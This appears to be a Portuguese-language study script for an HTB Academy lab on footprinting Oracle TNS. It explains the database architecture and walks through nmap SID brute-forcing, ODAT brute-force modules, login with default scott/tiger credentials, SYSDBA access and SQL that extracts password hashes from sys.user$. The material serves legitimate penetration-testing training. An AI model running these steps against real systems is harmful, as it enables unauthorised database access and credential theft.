#!/bin/bash
####################################################################################################
# HTB ACADEMY - FOOTPRINTING
# ORACLE TNS
#
# AULA COMPLETA (VERSÃO APOSTILA)
#
# Esta apostila foi escrita no mesmo estilo das aulas anteriores (DNS, SMB, SNMP,
# MySQL...). O objetivo não é apenas mostrar comandos, mas explicar o funcionamento
# interno do Oracle para que a enumeração faça sentido.
####################################################################################################

####################################################################################################
# 1. O QUE É O ORACLE DATABASE
####################################################################################################
#
# O Oracle Database é um Sistema Gerenciador de Banco de Dados Relacional (SGBDR)
# voltado principalmente para ambientes corporativos de grande porte.
#
# É amplamente utilizado por bancos, seguradoras, empresas de telecomunicações,
# órgãos governamentais e grandes ERPs, pois oferece alta disponibilidade,
# escalabilidade e mecanismos avançados de segurança.
#
# Diferentemente de bancos mais simples, como MySQL, a arquitetura do Oracle
# é composta por diversos componentes independentes.
#
# Durante um pentest dificilmente atacamos diretamente o banco.
# Primeiro precisamos entender como a infraestrutura Oracle está organizada.
#
####################################################################################################
# 2. ARQUITETURA DO ORACLE
####################################################################################################
#
# Um erro comum é acreditar que Banco de Dados = Instância.
#
# Não é.
#
# DATABASE
# ├── Datafiles
# ├── Control Files
# └── Redo Logs
#
# INSTANCE
# ├── Memória (SGA)
# ├── Processos (PMON, SMON, DBWn, LGWR...)
# └── Sessões dos usuários
#
# A instância acessa o banco físico.
#
# É justamente essa instância que iremos atingir através do Oracle Listener.
#
####################################################################################################
# 3. ORACLE NET (TNS)
####################################################################################################
#
# O Oracle utiliza um protocolo chamado Oracle Net.
#
# Dentro dele existe o TNS (Transparent Network Substrate).
#
# Fluxo:
#
# Cliente
#    ↓
# Oracle Listener (1521)
#    ↓
# SID / SERVICE_NAME
#    ↓
# Instância Oracle
#    ↓
# Banco de Dados
#
# Se o Listener estiver ativo mas o SID estiver incorreto,
# a conexão falhará.
#
####################################################################################################
# 4. SID, SERVICE_NAME E INSTANCE_NAME
####################################################################################################
#
# SID
# Identifica uma instância Oracle.
#
# SERVICE_NAME
# Nome lógico divulgado pelo Listener.
#
# INSTANCE_NAME
# Nome interno da instância.
#
# Em laboratórios HTB normalmente o SID é XE.
#
####################################################################################################
# 5. CONTAS PADRÃO
####################################################################################################
#
# SYS
# SYSTEM
# DBSNMP
# SCOTT
# HR
# OUTLN
# XDB
#
# Algumas permanecem habilitadas em ambientes mal configurados.
#
####################################################################################################
# 6. METODOLOGIA DO PENTEST
####################################################################################################
#
# 1 Descobrir Listener
# 2 Descobrir SID
# 3 Encontrar credenciais
# 4 Login
# 5 Enumerar usuários
# 6 Enumerar privilégios
# 7 Procurar hashes
# 8 Verificar privilégos administrativos
#
####################################################################################################
# 7. PREPARAÇÃO DO AMBIENTE
####################################################################################################

export TARGET="10.129.xxx.xxx"
export PORT=1521

git clone https://github.com/quentinhardy/odat.git
cd odat

python3.11 -m venv .venv
source .venv/bin/activate

python -m pip install --upgrade pip
python -m pip install "setuptools<81" wheel
python -m pip install --no-build-isolation cx_Oracle==8.3.0
python odat.py -h

####################################################################################################
# 8. SQLPLUS
####################################################################################################

sudo apt install oracle-instantclient-sqlplus -y

# SQLPlus é o cliente oficial Oracle.
# Ele permite executar comandos SQL diretamente na instância.

####################################################################################################
# 9. ENUMERAÇÃO DO LISTENER
####################################################################################################

sudo nmap -Pn -sV -p1521 "$TARGET"

# Confirmar versão do Listener

sudo nmap -Pn -p1521 -sC -sV "$TARGET"

####################################################################################################
# 10. DESCOBERTA DO SID
####################################################################################################

sudo nmap -Pn -p1521 --script oracle-sid-brute "$TARGET"

export SID="XE"

# O SID é necessário para abrir uma sessão Oracle.

####################################################################################################
# 11. ENUMERAÇÃO COM ODAT
####################################################################################################

python odat.py sidguesser -s "$TARGET" -p "$PORT"

python odat.py snguesser -s "$TARGET" -p "$PORT"

python odat.py all -s "$TARGET" -p "$PORT" -d "$SID"

# O módulo all executa diversos testes automaticamente.
# Entre eles:
#  - descoberta de usuários
#  - brute force
#  - módulos UTL*
#  - DIRECTORY
#  - privilégios

####################################################################################################
# 12. LOGIN
####################################################################################################

export ORACLE_USER="scott"
export ORACLE_PASS="tiger"

sqlplus "${ORACLE_USER}/${ORACLE_PASS}@${TARGET}:${PORT}/${SID}"

####################################################################################################
# 13. ENUMERAÇÃO INTERNA
####################################################################################################
#
# Objetivo:
# descobrir quem somos e quais permissões possuímos.
#

# SHOW USER;
# SELECT USER FROM dual;

# SELECT banner FROM v$version;
#
# Descobre versão do Oracle.

# SELECT * FROM session_roles;
#
# Roles da sessão.

# SELECT * FROM user_role_privs;
#
# Roles atribuídas ao usuário.

# SELECT * FROM user_sys_privs;
#
# Privilégios administrativos.

# SELECT table_name FROM user_tables;
#
# Tabelas pertencentes ao usuário.

# SELECT username FROM all_users;
#
# Todos os usuários conhecidos.

####################################################################################################
# 14. VIEWS IMPORTANTES
####################################################################################################
#
# v$version
#   versão
#
# v$instance
#   instância
#
# v$database
#   banco
#
# dba_users
#   usuários
#
# dba_role_privs
#   roles
#
# dba_sys_privs
#   privilégios
#
# dba_directories
#   diretórios
#
# sys.user$
#   hashes e informações internas

####################################################################################################
# 15. SYSDBA
####################################################################################################

sqlplus "${ORACLE_USER}/${ORACLE_PASS}@${TARGET}:${PORT}/${SID} as sysdba"

# SELECT sys_context('USERENV','ISDBA') FROM dual;

####################################################################################################
# 16. EXTRAÇÃO DO HASH
####################################################################################################

# SELECT name,password,spare4
# FROM sys.user$
# WHERE name='DBSNMP';

# PASSWORD = hash legado
# SPARE4 = hash moderno

####################################################################################################
# 17. DIRECTORY OBJECTS
####################################################################################################

# SELECT directory_name,directory_path
# FROM dba_directories;

# Esses objetos apontam para diretórios do sistema operacional.

####################################################################################################
# 18. TROUBLESHOOTING
####################################################################################################
#
# ORA-12541 -> Listener indisponível
# ORA-12514 -> SID incorreto
# ORA-12505 -> Instância inexistente
# ORA-01017 -> Login inválido
# ORA-28000 -> Conta bloqueada
# ORA-01031 -> Sem privilégios

####################################################################################################
# 19. RESUMO DA AULA
####################################################################################################
#
# Nesta aula aprendemos:
#
# ✓ Arquitetura Oracle
# ✓ Oracle Net / TNS
# ✓ Listener
# ✓ SID
# ✓ SERVICE_NAME
# ✓ SQLPlus
# ✓ ODAT
# ✓ Enumeração externa
# ✓ Enumeração interna
# ✓ Views administrativas
# ✓ SYSDBA
# ✓ Extração de hashes
# ✓ DIRECTORY Objects
#
# Fluxo HTB:
#
# Listener -> SID -> Credenciais -> Login -> Enumeração -> SYSDBA ->
# SYS.USER$ -> Hash DBSNMP -> DIRECTORY -> Objetivo concluído.
####################################################################################################
